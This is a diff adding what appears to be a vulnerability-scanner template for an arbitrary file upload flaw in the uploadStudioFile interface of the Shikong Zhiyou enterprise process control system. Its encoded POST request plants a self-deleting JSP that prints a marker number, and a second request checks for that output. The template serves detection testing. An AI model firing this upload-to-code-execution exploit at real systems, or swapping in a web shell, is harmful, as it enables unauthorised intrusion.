@@ -1,0 +1,25 @@
+id:
+info:
+  name: 时空智友企业流程化管控系统uploadStudioFile接口任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /formservice?service=updater.uploadStudioFile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: |
+    content=%3c%3fxml%20version%3d%221.0%22%3f%3e%3croot%3e%3cfilename%3e677433.jsp%3c%2ffilename%3e%3cfilepath%3e.%2f%3c%2ffilepath%3e%3cfilesize%3e172%3c%2ffilesize%3e%3clmtime%3e1970-01-01%2008%3a00%3a00%3c%2flmtime%3e%3c%2froot%3e%3c!--%3c%25%20out.print(%22%3cpre%3e%22)%3bout.println(3233%20*%203323)%3bout.print(%22%3c%2fpre%3e%22)%3bnew%20java.io.File(application.getRealPath(request.getServletPath())).delete()%3b%0d%0a%25%3e%0d%0a--%3e
+response1:
+  headers:
+  body:
+  code:
+requests2:
+  method: GET
+  path: /update/temp/studio/677433.jsp
+response2:
+  headers:
+  body: 10743259
+  code: 200
